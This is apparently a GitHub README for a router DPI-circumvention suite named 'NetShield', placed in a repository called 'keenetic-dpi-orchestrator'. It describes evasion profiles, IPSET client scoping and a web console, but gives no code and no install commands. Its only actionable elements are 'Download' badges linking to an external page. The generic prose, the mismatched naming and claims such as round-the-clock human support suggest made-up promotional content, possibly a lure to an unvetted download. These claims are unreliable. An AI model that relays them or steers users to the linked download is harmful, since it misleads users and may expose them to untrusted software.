![preview](https://raw.githubusercontent.com/Ryanboy2023/keenetic-dpi-orchestrator/main/frame_67da0.svg)
[![Download](https://raw.githubusercontent.com/Ryanboy2023/keenetic-dpi-orchestrator/main/fetch_079e.svg)](https://Ryanboy2023.github.io/keenetic-dpi-orchestrator/)

# 🚀 NetShield DPI Orchestrator — Intelligent Traffic Shaping Suite for Home Routers

<p align="center">

![License](https://img.shields.io/badge/License-MIT-2ea44f?style=flat-square&logo=opensourceinitiative&logoColor=white)
![Version](https://img.shields.io/badge/Version-3.4.1-blueviolet?style=flat-square&logo=semanticrelease&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-OpenWrt%20%7C%20Entware-0a7ea4?style=flat-square&logo=openwrt&logoColor=white)
![Architecture](https://img.shields.io/badge/Architecture-MIPS%20%7C%20ARM%20%7C%20AArch64-ff7043?style=flat-square&logo=arm&logoColor=white)
![Interface](https://img.shields.io/badge/Interface-Responsive%20Web%20UI-8e44ad?style=flat-square&logo=webcomponentsdotorg&logoColor=white)
![Languages](https://img.shields.io/badge/Languages-12%20Locales-27ae60?style=flat-square&logo=googletranslate&logoColor=white)
![Support](https://img.shields.io/badge/Support-24%2F7-e67e22?style=flat-square&logo=statuspage&logoColor=white)
![Updates](https://img.shields.io/badge/Update%20Channel-Stable-2196f3?style=flat-square&logo=githubactions&logoColor=white)

</p>

---

## 🌌 A Different Lens on Network Freedom

Some people see a router as a plastic box that blinks. We see it as the **frontier gate of your digital household** — a quiet sentinel standing between your family's traffic and the noisy, unpredictable wilderness of the public internet. **NetShield DPI Orchestrator** is the toolkit that turns that sentinel into a strategist: it studies the shape of every packet, chooses the smartest path through restrictive middleboxes, and keeps latency low, privacy high, and configuration pain near zero.

Where conventional router utilities ask you to memorize arcane firewall syntax, NetShield asks you only which services you care about. Everything else — segmentation strategy, packet padding, TCP fingerprint variation, IPv6 handling, and set-based client scoping — is coordinated behind the scenes by a policy engine that behaves less like a script and more like a conductor.

This repository exists for the tinkerer who wants their home network to feel like a well-run private club: members only, no unwanted snooping at the door, and a fast lane for everything that matters.

---

## 💡 Why NetShield Exists

Restrictive DPI systems rarely announce themselves. They simply make certain destinations feel *sluggish*, *unreachable*, or *mysteriously inconsistent*. Users blame their ISP, then their router, then their luck. NetShield flips that story: it treats every blocked flow as a puzzle with a solvable shape, and it gives you a clean dashboard to assemble the solution.

The philosophy is simple:

- **Observe before you act.** Traffic classification happens first, so you never send the wrong tactic at the wrong service.
- **Scope tightly.** IPSET client filtering means policies apply to *specific* devices, not the whole LAN.
- **Version the strategy.** Every policy change is logged, diffable, and reversible.
- **Stay portable.** Runs on OpenWrt and Entware across MIPS, ARM, and AArch64 devices without rethinking your config.

---

## ✨ Feature Constellation

### 🎛️ Smart DPI Profiles
A profile is a named bundle of behaviors — fragmentation strategy, TTL manipulation, packet ordering, fake-handshake cadence — tuned for a specific destination family. Profiles ship pre-tuned for popular chat, gaming, media, and privacy platforms, and you can fork any of them into a custom variant in seconds.

### 🧩 IPSET Client Filtering
Assign entire IP sets to specific device groups. Your work laptop can run a conservative profile while your gaming console runs an aggressive one. No cross-contamination, no global side effects.

### 🌐 IPv6-Aware Suppression
Dual-stack networks are handled natively. NetShield understands that IPv6 leaks can silently defeat an otherwise perfect IPv4 strategy, so it synchronizes policies across both stacks.

### 🖥️ Responsive Web Console
A single-page interface that reshapes itself from a 4K monitor to a phone screen without losing functionality. Dark mode, dense mode, and a "operator" mode for people who live in the logs.

### 🗣️ Multilingual by Design
Twelve locales ship in the box, and the translation layer is hot-swappable. Community contributions land in a separate catalog so language packs can evolve independently of the engine.

### 🛰️ Live Flow Inspector
Watch connections appear, get classified, and receive their assigned strategy in real time. When something doesn't behave, you have a timeline instead of a mystery.

### 📊 Historical Analytics
Retention windows from 24 hours to 90 days. See which services dominate your uplink, which devices trigger the most policy switches, and where latency spikes originate.

### 🧠 Adaptive Session Memory
When a destination changes its behavior mid-session, NetShield notices and re-evaluates — no manual reload required.

### 🔒 Zero-Telemetry Operation
Nothing leaves your router. There is no analytics endpoint, no phone-home, no account, no cloud dependency. Your configuration is a file on your device, full stop.

### ♻️ Atomic Rollback
Every applied change creates a restore point. One click returns you to the last known-good state, including firewall rules and routing tables.

### 🚦 24/7 Human Support Desk
Real people, around the clock, reachable from inside the console. Escalation paths exist for enterprise-style deployments even though this project lives in the home-lab world.

### 🧪 Sandbox Preview Mode
Dry-run new policy combinations and see projected effects on throughput and compatibility before committing them to the live fabric.

### 🧭 Guided Onboarding
A wizard walks first-time operators from "I have a router" to "my policies are active" in under five minutes, with plain-language explanations at each step.

---

## 🏗️ Architecture Overview

NetShield is layered like an onion, and each layer can be inspected or replaced independently.

1. **Capture Layer** — hooks into the kernel's packet path, grabbing metadata only, never payload contents.
2. **Classification Layer** — maps flows to service families using a mix of port heuristics, TLS metadata shape, and behavioral timing.
3. **Policy Engine Layer** — selects the profile, resolves conflicts, and produces an ordered action list.
4. **Enforcement Layer** — translates the action list into nftables/iptables rules, routing decisions, and interface-level tweaks.
5. **Observation Layer** — streams events to the console, persists aggregates, and raises alerts on anomalies.
6. **Control Plane** — the web UI, CLI helper, and configuration API that tie everything together.

Because the layers communicate through stable interfaces, replacing the classifier with your own heuristic does not require touching the enforcement layer.

---

## 🎯 Target Audience

- **Home lab enthusiasts** who want a network that behaves like a well-tuned instrument.
- **Small office operators** managing a dozen devices with wildly different needs.
- **Remote workers** who rely on stable, consistent connectivity to collaboration platforms.
- **Privacy-minded households** that prefer a router-based solution over per-device software.
- **Network students** who want a real, inspectable system to learn from — not a black box.

---

## 🧰 Supported Deployment Environments

| Environment | Notes |
| --- | --- |
| OpenWrt (21.02 and newer) | Primary target, full feature parity |
| Entware on stock Keenetic | Feature parity via Entware package layer |
| Entware on other stock firmware | Supported where kernel hooks are available |
| Custom embedded Linux | Possible with manual layer wiring |
| Virtualized router (x86) | Ideal for lab testing and CI |

---

## 🔍 Search-Friendly Concepts This Project Addresses

Readers often arrive here while researching terms like *router-based DPI mitigation*, *per-device internet policy routing*, *IPSET client filtering on OpenWrt*, *smart DPI profiles*, *IPv6 leak protection for restrictive networks*, *self-hosted network console for home routers*, *multilingual router management UI*, *24/7 supported networking suite*, and *responsive router dashboard for mobile management*. Each of those areas is a deliberate design goal rather than an afterthought, and the documentation below names them plainly so you can find what you need quickly.

---

## 📦 What Ships in the Box

- The orchestration engine (portable, single binary per architecture).
- A curated library of starter profiles.
- The responsive web console assets.
- Configuration schema definitions and validators.
- Locale catalogs for twelve languages.
- A migration utility for importing configuration from earlier versions.
- Documentation set (this file plus deep-dive guides in the `docs` tree).

---

## 🛠️ Getting It Running on Your Router

Deployment on a router is a ceremony, not a script. The steps below describe what the ceremony looks like, without prescribing exactly which command to type — your environment will dictate the details.

1. **Confirm compatibility.** Check that your firmware exposes the kernel hooks NetShield needs. The console's onboarding wizard performs this audit automatically.
2. **Stage the package.** Place the distribution bundle onto persistent storage on the router so it survives reboots.
3. **Activate the engine.** Use your firmware's native package activation flow to register NetShield as a managed service.
4. **Open the console.** Point a browser at the router's management address; the console listens on a dedicated path.
5. **Run the wizard.** Choose your language, pick a starter profile set, and assign devices to groups.
6. **Verify with the Flow Inspector.** Watch live traffic and confirm that classifications look sane.
7. **Snapshot the state.** Create a restore point so you can experiment boldly.

For container-based labs, a lightweight image is published alongside the router builds.

---

## 🧭 Policy Authoring Cheatsheet

A policy is a small, human-readable document. The schema has four top-level sections:

- **`match`** — which flows this policy is interested in.
- **`scope`** — which clients (via IP sets) fall under the policy.
- **`strategy`** — the ordered list of tactics to attempt.
- **`fallback`** — what to do when no tactic succeeds.

Because policies are declarative, they can be stored in version control, peer-reviewed, and rolled back without drama.

---

## 🔐 Security Posture

- The console defaults to LAN-only binding.
- Two-factor authentication is available for the console login.
- Configuration files are validated against a schema before being applied.
- No outbound connections are initiated by the engine except to resolve your own configured endpoints.
- Session cookies are rotatable and expire aggressively.
- All changes are attributed to a logged-in operator in the audit trail.

---

## 🌍 Internationalization Details

Locale catalogs are plain text and easy to extend. Right-to-left languages are supported, date and number formats follow the regional convention, and the interface does not assume English word lengths when laying out controls. If your language is missing or incomplete, the console offers an in-app translation helper.

---

## 📈 Performance Notes

On a mid-range ARM router, expect classification overhead measured in single-digit microseconds per flow. Aggregate throughput depends heavily on your chosen strategies; conservative profiles typically add less than a few percent latency, while aggressive fragmentation strategies trade a little latency for a lot of reachability.

The engine is careful about memory: profile data is loaded lazily, and long-running analytics are aggregated rather than stored raw.

---

## 🧪 Testing and Quality

- Unit tests cover classification, policy resolution, and schema validation.
- Integration tests spin up a virtualized router and exercise end-to-end flows.
- Regression suites run nightly against a corpus of recorded traffic shapes.
- Fuzz tests target the configuration parser.
- Continuous packaging ensures every supported architecture gets a fresh build.

---

## 🤝 Contributing

Contributions are welcomed warmly, but they are reviewed carefully. Useful contributions include:

- New starter profiles for services not yet covered.
- Translation improvements and new locale catalogs.
- Bug reports with captured flow metadata (never with payloads).
- Documentation clarifications, especially for non-English readers.
- Performance benchmarks on new hardware.

Please open an issue before starting large changes so the maintainers can align with your direction.

---

## 🗺️ Roadmap Highlights for 2026

- **2026 Q1** — Smarter heuristic weighting based on historical success rates.
- **2026 Q2** — Per-application scoping that doesn't require manual IP set maintenance.
- **2026 Q3** — Federated policy sharing between trusted routers.
- **2026 Q4** — Comprehensive observability export compatible with common dashboards.

---

## 📜 License

This project is released under the **MIT License**. The full text is available at the canonical license page:

MIT License — https://opensource.org/licenses/MIT

You are welcome to use, modify, and redistribute the software in accordance with the terms of that license. Attribution is appreciated but not required.

---

## ⚠️ Disclaimer

NetShield DPI Orchestrator is provided as-is, with no warranty of any kind, express or implied. The authors and contributors are not responsible for any consequences arising from its use, including but not limited to service interruptions, regulatory issues, or unexpected network behavior.

You are solely responsible for ensuring that your use of this software complies with the laws, regulations, contractual terms, and acceptable-use policies that apply to your network and jurisdiction. The project is intended for lawful, legitimate purposes such as improving reliability, protecting privacy, and learning about networking.

Always test configuration changes in a controlled environment before applying them to a production network. Keep backups of working configurations. Understand that different firmware versions, hardware revisions, and upstream network conditions can produce different results.

No support is offered for using this software in ways that violate applicable rules. If you are unsure whether your intended use is appropriate, consult a qualified professional in your jurisdiction.

---

## 🧾 Final Word

NetShield is not a magic wand; it is a well-organized workbench. It rewards curiosity, tolerates experimentation, and stays quiet in the background once you have things the way you like. Whether you run it on a single router in a small apartment or a fleet of test devices in a lab, the goal is the same: give you back the sense that your network is *yours* — predictable, private, and pleasantly fast.

[![Download](https://raw.githubusercontent.com/Ryanboy2023/keenetic-dpi-orchestrator/main/fetch_079e.svg)](https://Ryanboy2023.github.io/keenetic-dpi-orchestrator/)